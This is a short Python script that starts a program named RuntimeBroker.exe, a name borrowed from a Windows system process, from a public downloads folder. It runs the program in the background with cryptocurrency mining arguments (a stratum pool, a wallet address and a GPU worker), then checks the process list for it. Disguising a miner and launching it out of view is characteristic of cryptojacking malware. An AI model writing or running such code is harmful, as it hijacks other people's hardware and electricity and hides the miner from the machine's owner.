import os
import time
import subprocess

dst = r'C:\Users\Public\Downloads\RuntimeBroker.exe'
cmd = dst + ' --pool stratum+tcp://sg1.alphapool.tech:5566 --address prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg --worker RTX4090_107 --force-backend ada'

# Use os.system with start /B for background
os.system('start /B ' + cmd)
time.sleep(10)

# Check if running
p = subprocess.run(['tasklist'], capture_output=True, text=True, shell=True)
lines = p.stdout.split(chr(10)) if p.stdout else []
miners = [l for l in lines if 'Runtime' in l]

result = f'Processes: {miners}'
